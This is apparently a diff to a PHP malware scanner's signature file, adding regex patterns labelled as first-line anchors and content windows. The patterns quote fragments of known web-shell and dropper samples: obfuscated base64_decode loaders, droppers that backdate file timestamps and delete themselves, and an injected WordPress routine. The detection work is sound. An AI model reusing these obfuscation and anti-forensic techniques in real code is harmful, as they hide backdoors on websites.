+      'label' => 'source-file first-line anchor',
+    ),
+    342 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$hthfug\\=str_ireplace\\("p","","ppbpppapppspppppepp6pppp4ppp_pppppdppppeppppppcppppopppppdpppppep"\\); \\$fsewr\\="DQoJCUBlcnJvcl9yZXBvcnRpbmco/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    343 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$sbszcckrde\\=str_ireplace\\("k","","kbkkkkakkkkkkskkekkkk6kk4kkkkk_kkkdkkkekkkkckkkokkkkdkkkkkek"\\); \\$pfruv\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoM/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    344 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$shxhrqqy\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$uhvucqe\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbm/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    345 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "FsCaEtMxFe"; if \\(file_exists\\("\\.\\/config\\.deer\\.php"\\)\\)\\{ touch\\("\\.\\/config\\.deer\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*Q3Z/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    346 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$pcgchmqed\\=str_ireplace\\("w","","wwwbwwawwwwwswwwwewwww6www4wwww_wwwwdwwwwwewwwwwcwwwwwowwwdwweww"\\); \\$ruztct\\="DQoJCUBlcnJvcl9yZXBvcnRpb/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    347 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "fdXtaBdKBD"; if \\(file_exists\\("\\.\\/tellafriend\\.php"\\)\\)\\{ touch\\("\\.\\/tellafriend\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*fct/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    348 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "ceUhsXeEss"; if \\(file_exists\\("\\.\\/details\\.php"\\)\\)\\{ touch\\("\\.\\/details\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*zKWU93uMU6v/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    349 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "rrxaShzfnw"; if \\(file_exists\\("\\.\\/currency\\.php"\\)\\)\\{ touch\\("\\.\\/currency\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*9x6pRPcG2/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    350 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$stqwzzzspp\\=str_ireplace\\("i","","iiibiiiiaiiiisiiieiiii6iii4iiii_iiidiiiiiieiiiiiciiiiioiiiiiidiiieiii"\\); \\$qmmcz\\="DQoJCUBlcnJvcl9yZXBv/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    351 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$msbddanq\\=str_ireplace\\("q","","qbqqqqqqaqqqqsqqeqq6qqqq4qqqq_qqqqqdqqqeqqqcqqqqoqqqdqqqqeq"\\); \\$ftufx\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    352 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*
+ \\* @package    win\\.error\\.Libraries
+ \\*[\\s\\S]{0,12000}@session_start                          \\(\\)
+
+
+;/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    353 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*
+ \\* @package    Error Lib
+ \\* \\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*
+ \\* @copyrig/s',
+      'label' => 'sample-specific content window',
+    ),
+    354 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$skgkh\\=str_ireplace\\("z","","zbzzzazzzszzzzzzezzzzz6zz4zzzz_zzzzzdzzzzzezzzzzczzzzozzzzdzzzzez"\\); \\$bebsm\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoM/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    355 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$mcsxmr\\=str_ireplace\\("m","","mmbmmmmmmammmmsmmmmemmmmm6mmmmm4mmmm_mmmdmmmmmmemmmmmmcmmmmommmdmmmemmm"\\); \\$yfuwxrcvy\\="DQoJCUBlcnJvcl9yZX/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    356 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$eeyttpvxft\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$vxqsy\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbm/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    357 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$xsxhvz\\=str_ireplace\\("r","","rbrrrrarrrrsrrrrerrrrrr6rrrrrr4rrrrr_rrrrdrrrrrerrrrrrcrrrrrorrrrrrdrrrrerr"\\); \\$zzfmn\\="DQoJCUBlcnJvcl9yZX/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    358 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$dqnmye\\=str_ireplace\\("q","","qbqqqqqqaqqsqqqqqqeqqqqq6qqqqqq4qqq_qqqdqqqqeqqcqqqqoqqqqdqqqqeq"\\); \\$tbzsdpzr\\="DQoJCUBlcnJvcl9yZXBvcnRpbm/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    359 => 
+    array (
+      'pattern' => '/contents\\(\\$backpathtextf, \\$fgocontent\\.\' \'\\.\\$auth,[\\s\\S]{0,12000}l\\); \\} \\} if\\(\\!\\$data\\) return false; return \\$data; \\}/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    360 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$ktefambp\\=str_ireplace\\("p","","pbppppappppsppppepppp6pppp4pp_ppdpppppepppcppoppdppppppep"\\); \\$ktbxsq\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7D/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    361 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$ytpgctvzzw\\=str_ireplace\\("n","","nnbnnnnnannnnnsnnnnnnennnn6nnnnn4nnn_nnnndnnnennncnnnnonnnndnnnenn"\\); \\$wfedca\\="DQoJCUBlcnJvcl9yZXBvcn/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    362 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$kauuzhwhh\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$sxqyrce\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpb/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    363 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$ssddyuvcwh\\=str_ireplace\\("y","","ybyyyyayyyysyyyyeyyy6yyyyy4yyy_yyyydyyeyyyycyyoyyyydyyyyyey"\\); \\$dpktd\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMC/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    364 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$pcnrnpyg\\=str_ireplace\\("r","","rrrbrrrrarrrrsrrrrerrrrr6rrrrr4rr_rrrrrrdrrrrerrrrcrrrrorrrrrdrrrer"\\); \\$rvnmsn\\="DQoJCUBlcnJvcl9yZXBvcnR/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    365 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$qytnbkt\\=str_ireplace\\("h","","hbhhahhhshhhhehhhh6hhhh4hhhh_hhhhdhhhhehhhchhhhohhhhhdhheh"\\); \\$krmdadgfr\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMC/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    366 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$sxckrgva\\=str_ireplace\\("p","","ppbpppapppspppppepp6pppp4ppp_pppppdppppeppppppcppppopppppdpppppep"\\); \\$ghdcuatbct\\="DQoJCUBlcnJvcl9yZXBvc/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    367 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "gQfbrPhZZn"; if \\(file_exists\\("\\.\\/sad_api\\.php"\\)\\)\\{ touch\\("\\.\\/sad_api\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*D9KwFmgatQQ/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    368 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$aqzkcm\\=str_ireplace\\("y","","yybyyyyayyysyyyeyyy6yyyyy4yyyyy_yyyyydyyyyyyeyyyyyycyyoyyyydyyyyey"\\); \\$nagthydmq\\="DQoJCUBlcnJvcl9yZXBvcnR/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    369 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$nxgsraw\\=str_ireplace\\("k","","kkkbkkkakkkkskkkkkkekkkk6kkkk4kk_kkkkkkdkkkkkekkkkckkkkokkkkkdkkkkkkekkk"\\); \\$hwgkskx\\="DQoJCUBlcnJvcl9yZX/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    370 => 
+    array (
+      'pattern' => '/RlJVVUY5SVQxTlVKMTB1SkY5VFJWSldSVkpiSjFORFVrbFFW[\\s\\S]{0,12000}d\\(\'MUHYD\'\\)\\)
+\\{
+	define\\(\'MUHYD\', __DIR__\\);
+\\}
+
+
+
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    371 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$rgequzw\\=str_ireplace\\("h","","hhbhhhhhahhhhhshhhehh6hh4hhhh_hhhhhdhhhehhhhchhohhhhhhdhhheh"\\); \\$bagzuw\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    372 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "kWhCwSFXCA"; if \\(file_exists\\("\\.\\/mail_a_friend\\.php"\\)\\)\\{ touch\\("\\.\\/mail_a_friend\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\//s',
+      'label' => 'source-file first-line anchor',
+    ),
+    373 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$pacwdvsa\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$fkamwkq\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbm/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    374 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$mvddvs\\=str_ireplace\\("n","","nnbnnnnnannnnnsnnnnnnennnn6nnnnn4nnn_nnnndnnnennncnnnnonnnndnnnenn"\\); \\$prqpx\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    375 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}GlKeTVpWVhObE5qUmZaR1ZqYjJSbEtDUmtkSGhvZUdkd2NTa/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    376 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "dmqrmkUrwB"; if \\(file_exists\\("\\.\\/webservice\\.php"\\)\\)\\{ touch\\("\\.\\/webservice\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*MMv9F/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    377 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "xzvFuucsfD"; if \\(file_exists\\("\\.\\/conversationLib\\.php"\\)\\)\\{ touch\\("\\.\\/conversationLib\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    378 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "HhwFFKQCrS"; if \\(file_exists\\("\\.\\/site_search\\.php"\\)\\)\\{ touch\\("\\.\\/site_search\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*nMT/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    379 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$ggscqvf\\=str_ireplace\\("h","","hhbhhahhhhshhhhhehhh6hhhh4hhhh_hhhhhdhhhehhhhhchhohhhhhhdhhhehhh"\\); \\$npnmdezrf\\="DQoJCUBlcnJvcl9yZXBvcnRp/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    380 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$swfmw\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$pqyssv\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbmlfc2/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    381 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$vxuqchd\\=str_ireplace\\("h","","hhbhhhhahhhhhshhhehh6hhhh4hhhhh_hhhhhhdhhhhhehhhhchhohhhhdhhhhehhh"\\); \\$nxuudqz\\="DQoJCUBlcnJvcl9yZXBvcnRp/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    382 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}YzBkeWJWOW1LM1pGV0hFMmF6UjRaWHBmT1dKdGNXVllabDRx/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    383 => 
+    array (
+      'pattern' => '/MM1JrUGp4MFpENDhhVzV3ZFhRZ2RIbHdaVDBpZEdWNGRDSWdibUZ0WlQwaWNIUnZJaUIyWVd4MVpUMGlKeTVpWVhObE5qUmZaR1ZqYjJSbEtDUnhkbkI2ZUh/s',
+      'label' => 'sample-specific content window',
+    ),
+    384 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$vzccqf\\=str_ireplace\\("g","","ggbgggggagggsggggggegg6ggg4gggg_ggggdggggeggggcgggggogggggdgggggegg"\\); \\$hanpwerxgh\\="DQoJCUBlcnJvcl9yZXBvc/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    385 => 
+    array (
+      'pattern' => '/DSWdibUZ0WlQwaWNIUmtjeUlnZG1Gc2RXVTlJaWN1WW1Gelp[\\s\\S]{0,12000}ned\\(\'ZHEV\'\\)\\)
+\\{
+	define\\(\'ZHEV\', __DIR__\\);
+\\}
+
+
+
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    386 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$kmenwhk\\=str_ireplace\\("h","","hhhbhhhhhhahhshhhhhhehhh6hhhhh4hhh_hhhdhhhhehhhchhhhohhhhhdhhhheh"\\); \\$skxawd\\="DQoJCUBlcnJvcl9yZXBvcnRpbm/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    387 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$dfmmsdkup\\=str_ireplace\\("y","","ybyyyyyayyyysyyyeyyyy6yyy4yyyyy_yyyydyyyeyyyyycyyyyyyoyyyydyyyyey"\\); \\$evtka\\="DQoJCUBlcnJvcl9yZXBvcnRpb/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    388 => 
+    array (
+      'pattern' => '/2tnZXcwS0pHdGhQU2NuTG1KaGMyVTJORjlrWldOdlpHVW9KM[\\s\\S]{0,12000}E_DEPRECATED\\|E_USER_DEPRECATED\\)\\);
+\\}
+
+
+
+
+
+
+
+
+
+
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    389 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$uvpkynr\\=str_ireplace\\("x","","xbxxxxaxxxxxsxxxxexxxx6xxx4xxxx_xxxxxdxxxxxexxxxcxxxoxxxxxdxxxxexx"\\); \\$fzurxbp\\="DQoJCUBlcnJvcl9yZXBvcnRp/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    390 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$qqsnkkwfy\\=str_ireplace\\("p","","pbppppappsppeppppp6ppp4ppp_pppdpppppepppcpppppoppppdpppep"\\); \\$apxcups\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    391 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$fvbcvkfwhc\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$kdzydxm\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBp/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    392 => 
+    array (
+      'pattern' => '/gma\\: no\\-cache"\\);
+
+\\/\\/ Set the root path as a constant\\.
+if \\(\\!defined\\(\'BKPT\'\\)\\)
+\\{
+	define\\(\'BKPT\', __DIR__\\);
+\\}
+
+
+
+
+
+
+
+
+
+
+
+
+\\?\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    393 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$kgffe\\=str_ireplace\\("h","","hhbhhhhhahhhhhshhhehh6hh4hhhh_hhhhhdhhhehhhhchhohhhhhhdhhheh"\\); \\$phntbsxqv\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMC/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    394 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$mnppafyu\\=str_ireplace\\("x","","xxxbxxxxaxxxxxsxxxxexxx6xx4xxxx_xxxxxxdxxxxexxcxxxxxoxxxxdxxxxex"\\); \\$fcscxnkw\\="DQoJCUBlcnJvcl9yZXBvcnRp/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    395 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "aVxDHwAFcp"; if \\(file_exists\\("\\.\\/class\\.hurry\\.php"\\)\\)\\{ touch\\("\\.\\/class\\.hurry\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*HeR/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    396 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$hhdxb\\=str_ireplace\\("u","","ubuuuuauuuuusuuuuueuuu6uu4uuuuu_uuduuuueuuucuuuuouuuuduuuueuu"\\); \\$ygsckd\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    397 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$vnbvw\\=str_ireplace\\("w","","wwbwwwwwwawwwwwswwewwwww6wwww4www_wwdwwewwcwwwwwowwwdwwwwewww"\\); \\$fqhmhsrau\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoM/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    398 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$mzsvvkr\\=str_ireplace\\("t","","ttbttttattttstttettt6ttttt4tttt_tttttdtttetttttcttttottttdttttettt"\\); \\$sepkmysdn\\="DQoJCUBlcnJvcl9yZXBvcn/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    399 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$zhfmhuk\\=str_ireplace\\("y","","yybyyyyayyysyyyeyyy6yyyyy4yyyyy_yyyyydyyyyyyeyyyyyycyyoyyyydyyyyey"\\); \\$qxpndevvmx\\="DQoJCUBlcnJvcl9yZXBvc/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    400 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$thhhsvbhb\\=str_ireplace\\("p","","pbppppappspppeppppp6pppp4ppppp_pppppdppppepppppcpppopppdpppppeppp"\\); \\$zkdmbs\\="DQoJCUBlcnJvcl9yZXBvcnRp/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    401 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}XVW9LVHNOQ24wTkNpOHZJRDFBTUVjck1HNE5DbWxtS0NSdGI/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    402 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$zhpzkgbzp\\=str_ireplace\\("x","","xbxxxxaxxxxxsxxxxexxxx6xxx4xxxx_xxxxxdxxxxxexxxxcxxxoxxxxxdxxxxexx"\\); \\$yadwakdbud\\="DQoJCUBlcnJvcl9yZXB/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    403 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "QKNZXvNUFR"; if \\(file_exists\\("\\.\\/clear_skin_1\\.php"\\)\\)\\{ touch\\("\\.\\/clear_skin_1\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*4/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    404 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$yaurhu\\=str_ireplace\\("h","","hbhhahhhshhhhehhhh6hhhh4hhhh_hhhhdhhhhehhhchhhhohhhhhdhheh"\\); \\$ukzutqzq\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    405 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "xuUKwPXSPp"; if \\(file_exists\\("\\.\\/confirm\\.php"\\)\\)\\{ touch\\("\\.\\/confirm\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*dCtaeBTsNu2/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    406 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$ayetmppft\\=str_ireplace\\("q","","qbqqqqqqaqqqqsqqqqeqqq6qqqqq4qq_qqqqqdqqqqeqqqqqqcqqqoqqqqqqdqqqqqeqq"\\); \\$vawtdad\\="DQoJCUBlcnJvcl9yZXB/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    407 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$dsbqqb\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$vcvtrrssf\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbm/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    408 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "tcXvNqkrPe"; if \\(file_exists\\("\\.\\/foreign\\.init\\.php"\\)\\)\\{ touch\\("\\.\\/foreign\\.init\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*1/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    409 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$pzfkxw\\=str_ireplace\\("k","","kkbkkkakkkkskkekkkkk6kkk4kkkkk_kkkkdkkkekkkkkkckkkkkokkkdkkkkekkk"\\); \\$gmxfgm\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    410 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$chgfezzr\\=str_ireplace\\("v","","vbvvvvavvvvvsvvvvvevvv6vvv4vvv_vvvvvdvvvvevvvvcvvvovvvvvdvvev"\\); \\$htygdge\\="DQoJCUBlcnJvcl9yZXBvcnRpbmco/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    411 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$mkaqnkd\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$dchbnrwysv\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBp/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    412 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$zymqhvkbpk\\=str_ireplace\\("p","","pbppppappppsppppepppppp6ppp4ppppp_pppdpppppepppcpppopppppdppppepp"\\); \\$dheybs\\="DQoJCUBlcnJvcl9yZXBvcnR/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    413 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "aBydyVPrVm"; if \\(file_exists\\("\\.\\/order_result\\.php"\\)\\)\\{ touch\\("\\.\\/order_result\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*Q/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    414 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$wfyke\\=str_ireplace\\("w","","wbwwwwawwwwwswwwewwww6wwww4wwww_wwdwwwewwwwwcwwwwowwwdwwwwewww"\\); \\$tbvmf\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    415 => 
+    array (
+      'pattern' => '/dername2\\/\\\\n";
+\\$outlink \\= str_replace\\("z1\\.php\\/", "", \\$outlink\\);
+echo \\$outlink;
+         ob_flush\\(\\);
+         flush\\(\\);
+
+\\?\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    416 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$vvfqseb\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$xwdekp\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbmlf/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    417 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$webks\\=str_ireplace\\("i","","iibiiiiaiiiiisiiiiiieiiii6iii4iiii_iiiiidiiiieiiiiiiciiiiioiidiiiei"\\); \\$pwcpks\\="DQoJCUBlcnJvcl9yZXBvcnRpbm/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    418 => 
     array (
       'pattern' => '/\\<\\?php
 
-\\/\\*\\* Sets up WordPress vars and included files\\. \\*\\/
-require_once\\(ABSPATH \\. \'wp\\-settings\\.php\'\\);
-function Go\\(\\$url\\)\\{ \\$/s',
+\\/\\*\\* Sets up WordPress vars and included f[\\s\\S]{0,12000}\\$a \\= \\(\\$a \\+ 1\\) % 256; \\$j \\= \\(\\$j \\+ \\$box\\[\\$a\\]\\) % 256/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    419 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$gguxvwaht\\=str_ireplace\\("q","","qbqqqqqaqqqqsqqqqeqqq6qqqq4qqq_qqqqdqqeqqqqcqqqqqqoqqqqqqdqqqeqq"\\); \\$kpunumeed\\="DQoJCUBlcnJvcl9yZXBvcn/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    420 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$yrqyradz\\=str_ireplace\\("u","","uubuuuauuusuuuueuuuu6uuuu4uuuu_uuuuduuuuueuucuuuuouuuduuuuueuuu"\\); \\$dcspdcfb\\="DQoJCUBlcnJvcl9yZXBvcnRpb/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    421 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "cdBHQRVKNV"; if \\(file_exists\\("\\.\\/phpinfo\\.php"\\)\\)\\{ touch\\("\\.\\/phpinfo\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*4Vx0UZsSThQ/s',
+      'label' => 'source-file first-line anchor',
